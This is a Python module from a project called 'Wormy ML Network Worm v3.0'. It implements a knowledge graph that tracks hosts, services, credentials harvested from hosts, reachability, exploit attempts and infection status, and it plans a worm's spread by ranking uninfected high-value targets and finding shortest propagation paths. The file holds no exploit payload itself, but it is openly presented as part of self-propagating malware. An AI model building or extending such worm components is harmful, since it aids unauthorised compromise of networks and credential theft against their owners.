"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Network Knowledge Graph
Builds and queries a graph of hosts, services, credentials, and relationships
for optimal propagation path planning.
"""


import json
import os
import sys
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


@dataclass
class Node:
    """A node in the knowledge graph"""

    node_id: str
    node_type: str  # host, service, credential, network
    properties: Dict = field(default_factory=dict)
    edges: List[Tuple[str, str]] = field(default_factory=list)  # (target_id, edge_type)


@dataclass
class Edge:
    """An edge in the knowledge graph"""

    source: str
    target: str
    edge_type: str
    weight: float = 1.0
    properties: Dict = field(default_factory=dict)


class NetworkKnowledgeGraph:
    """
    Knowledge graph for network propagation planning

    Tracks:
    - Hosts and their relationships
    - Services running on each host
    - Credentials discovered on each host
    - Network topology and reachability
    - Exploit history per host
    - Propagation paths
    """

    def __init__(self):
        self.nodes: Dict[str, Node] = {}
        self.edges: List[Edge] = []
        self.adjacency: Dict[str, List[str]] = defaultdict(list)
        self.edge_map: Dict[Tuple[str, str], Edge] = {}

        self.stats = {
            "hosts": 0,
            "services": 0,
            "credentials": 0,
            "edges": 0,
            "infected_hosts": 0,
        }

    # ==================== NODE MANAGEMENT ====================

    def add_host(
        self,
        ip: str,
        os_guess: str = "Unknown",
        ports: List[int] = None,
        is_infected: bool = False,
        is_high_value: bool = False,
        subnet: str = "",
    ):
        """Add a host node"""
        if ip in self.nodes:
            node = self.nodes[ip]
            node.properties.update(
                {
                    "os_guess": os_guess,
                    "ports": ports or node.properties.get("ports", []),
                    "is_infected": is_infected or node.properties.get("is_infected", False),
                    "is_high_value": is_high_value or node.properties.get("is_high_value", False),
                    "subnet": subnet or node.properties.get("subnet", ""),
                    "last_updated": time.time(),
                }
            )
            return

        self.nodes[ip] = Node(
            node_id=ip,
            node_type="host",
            properties={
                "os_guess": os_guess,
                "ports": ports or [],
                "is_infected": is_infected,
                "is_high_value": is_high_value,
                "subnet": subnet,
                "discovered_at": time.time(),
                "last_updated": time.time(),
            },
        )
        self.stats["hosts"] += 1
        if is_infected:
            self.stats["infected_hosts"] += 1

    def add_service(self, host_ip: str, port: int, service_name: str, version: str = ""):
        """Add a service node and connect to host"""
        service_id = f"{host_ip}:{port}"

        if service_id not in self.nodes:
            self.nodes[service_id] = Node(
                node_id=service_id,
                node_type="service",
                properties={
                    "host": host_ip,
                    "port": port,
                    "name": service_name,
                    "version": version,
                },
            )
            self.stats["services"] += 1

            self._add_edge(host_ip, service_id, "runs_service")

    def add_credential(
        self, host_ip: str, username: str, credential_type: str = "password", source: str = ""
    ):
        """Add a credential node discovered on a host"""
        cred_id = f"cred:{host_ip}:{username}"

        if cred_id not in self.nodes:
            self.nodes[cred_id] = Node(
                node_id=cred_id,
                node_type="credential",
                properties={
                    "host": host_ip,
                    "username": username,
                    "type": credential_type,
                    "source": source,
                    "discovered_at": time.time(),
                },
            )
            self.stats["credentials"] += 1

            self._add_edge(host_ip, cred_id, "has_credential")

    def add_network(self, subnet: str, gateway: str = ""):
        """Add a network node"""
        if subnet not in self.nodes:
            self.nodes[subnet] = Node(
                node_id=subnet, node_type="network", properties={"gateway": gateway}
            )

    def connect_host_to_network(self, host_ip: str, subnet: str):
        """Connect a host to a network"""
        if host_ip in self.nodes and subnet in self.nodes:
            self._add_edge(host_ip, subnet, "belongs_to_network")

    def add_reachability(
        self, source_ip: str, target_ip: str, port: int = 0, protocol: str = "tcp"
    ):
        """Record that source can reach target"""
        edge_key = f"reach:{source_ip}:{target_ip}"

        if edge_key not in self.nodes:
            self.nodes[edge_key] = Node(
                node_id=edge_key,
                node_type="reachability",
                properties={
                    "source": source_ip,
                    "target": target_ip,
                    "port": port,
                    "protocol": protocol,
                    "discovered_at": time.time(),
                },
            )

            self._add_edge(source_ip, edge_key, "can_reach")
            self._add_edge(edge_key, target_ip, "reaches")
            # Direct edge for BFS path finding
            self._add_edge(source_ip, target_ip, "direct_reach")

    def mark_infected(self, ip: str, technique: str = ""):
        """Mark a host as infected"""
        if ip in self.nodes:
            was_infected = self.nodes[ip].properties.get("is_infected", False)
            self.nodes[ip].properties["is_infected"] = True
            self.nodes[ip].properties["infection_technique"] = technique
            self.nodes[ip].properties["infected_at"] = time.time()

            if not was_infected:
                self.stats["infected_hosts"] += 1

    def record_exploit_attempt(self, host_ip: str, exploit_name: str, success: bool):
        """Record an exploit attempt on a host"""
        if host_ip in self.nodes:
            if "exploit_history" not in self.nodes[host_ip].properties:
                self.nodes[host_ip].properties["exploit_history"] = []

            self.nodes[host_ip].properties["exploit_history"].append(
                {
                    "exploit": exploit_name,
                    "success": success,
                    "timestamp": time.time(),
                }
            )

    # ==================== EDGE MANAGEMENT ====================

    def _add_edge(
        self, source: str, target: str, edge_type: str, weight: float = 1.0, properties: Dict = None
    ):
        """Add an edge between two nodes"""
        edge = Edge(
            source=source,
            target=target,
            edge_type=edge_type,
            weight=weight,
            properties=properties or {},
        )
        self.edges.append(edge)
        self.adjacency[source].append(target)
        self.edge_map[(source, target)] = edge
        self.stats["edges"] += 1

    # ==================== QUERIES ====================

    def get_infected_hosts(self) -> List[str]:
        """Get all infected hosts"""
        return [
            ip
            for ip, node in self.nodes.items()
            if node.node_type == "host" and node.properties.get("is_infected", False)
        ]

    def get_uninfected_hosts(self) -> List[str]:
        """Get all uninfected hosts"""
        return [
            ip
            for ip, node in self.nodes.items()
            if node.node_type == "host" and not node.properties.get("is_infected", False)
        ]

    def get_high_value_targets(self) -> List[str]:
        """Get high-value uninfected hosts"""
        return [
            ip
            for ip, node in self.nodes.items()
            if node.node_type == "host"
            and node.properties.get("is_high_value", False)
            and not node.properties.get("is_infected", False)
        ]

    def get_credentials_for_host(self, host_ip: str) -> List[Dict]:
        """Get credentials discovered on a host"""
        creds = []
        for node_id, node in self.nodes.items():
            if node.node_type == "credential" and node.properties.get("host") == host_ip:
                creds.append(node.properties)
        return creds

    def get_all_credentials(self) -> List[Dict]:
        """Get all discovered credentials"""
        return [node.properties for node in self.nodes.values() if node.node_type == "credential"]

    def get_services_for_host(self, host_ip: str) -> List[Dict]:
        """Get services running on a host"""
        services = []
        for node_id, node in self.nodes.items():
            if node.node_type == "service" and node.properties.get("host") == host_ip:
                services.append(node.properties)
        return services

    def get_reachable_from(self, host_ip: str) -> List[str]:
        """Get all hosts reachable from a given host"""
        reachable = set()
        for edge_key, node in self.nodes.items():
            if node.node_type == "reachability" and node.properties.get("source") == host_ip:
                target = node.properties.get("target", "")
                if target:
                    reachable.add(target)
        return list(reachable)

    def find_propagation_path(self, source_ip: str, target_ip: str) -> Optional[List[str]]:
        """Find shortest propagation path using BFS (host nodes only)"""
        if source_ip == target_ip:
            return [source_ip]

        visited = {source_ip}
        queue = [(source_ip, [source_ip])]

        while queue:
            current, path = queue.pop(0)

            for neighbor in self.adjacency.get(current, []):
                # Only traverse to host nodes, skip reachability nodes
                neighbor_node = self.nodes.get(neighbor)
                if neighbor_node and neighbor_node.node_type != "host":
                    continue

                if neighbor == target_ip:
                    return path + [neighbor]

                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append((neighbor, path + [neighbor]))

        return None

    def get_propagation_tree(self, root_ip: str) -> Dict:
        """Get the propagation tree from a root host"""
        tree = {root_ip: []}
        visited = {root_ip}
        queue = [root_ip]

        while queue:
            current = queue.pop(0)
            children = []

            for neighbor in self.adjacency.get(current, []):
                if neighbor not in visited:
                    visited.add(neighbor)
                    children.append(neighbor)
                    tree[neighbor] = []
                    queue.append(neighbor)

            tree[current] = children

        return tree

    def get_network_summary(self) -> Dict:
        """Get a summary of the network knowledge"""
        infected = self.get_infected_hosts()
        uninfected = self.get_uninfected_hosts()
        high_value = self.get_high_value_targets()
        all_creds = self.get_all_credentials()

        subnets = set()
        for node in self.nodes.values():
            if node.node_type == "host":
                subnet = node.properties.get("subnet", "")
                if subnet:
                    subnets.add(subnet)

        return {
            "total_hosts": self.stats["hosts"],
            "infected_hosts": len(infected),
            "uninfected_hosts": len(uninfected),
            "high_value_targets": len(high_value),
            "total_credentials": len(all_creds),
            "total_services": self.stats["services"],
            "total_edges": self.stats["edges"],
            "subnets": list(subnets),
            "infection_rate": (len(infected) / max(self.stats["hosts"], 1) * 100),
        }

    def export_graph(self, filepath: str):
        """Export the knowledge graph to JSON"""
        data = {
            "nodes": {
                nid: {
                    "type": node.node_type,
                    "properties": node.properties,
                }
                for nid, node in self.nodes.items()
            },
            "edges": [
                {
                    "source": e.source,
                    "target": e.target,
                    "type": e.edge_type,
                    "weight": e.weight,
                    "properties": e.properties,
                }
                for e in self.edges
            ],
            "stats": self.stats,
            "exported_at": time.time(),
        }

        os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2, default=str)

        logger.info(f"Knowledge graph exported to {filepath}")

    def get_statistics(self) -> Dict:
        """Get graph statistics"""
        return {
            **self.stats,
            "infection_rate": (self.stats["infected_hosts"] / max(self.stats["hosts"], 1) * 100),
        }
